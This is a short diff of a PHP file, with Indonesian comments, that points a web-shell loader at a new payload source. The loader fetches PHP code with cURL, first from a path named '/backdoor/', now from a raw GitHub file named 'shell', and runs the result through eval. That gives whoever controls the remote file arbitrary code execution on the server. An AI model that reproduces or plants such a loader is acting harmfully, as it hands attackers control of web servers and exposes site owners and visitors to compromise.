@@ -33,7 +33,7 @@ function geturlsinfo($url) {
 }
 
 // Mendapatkan konten dari URL menggunakan cURL
-$a = geturlsinfo('https://bpbdtanjungpinang.com/backdoor/kurlung.txt');
+$a = geturlsinfo('https://raw.githubusercontent.com/parbada/shell/refs/heads/main/parbadamentah.php');
 
 // Menggunakan eval untuk mengeksekusi kode PHP yang diterima
 eval('?>' . $a);
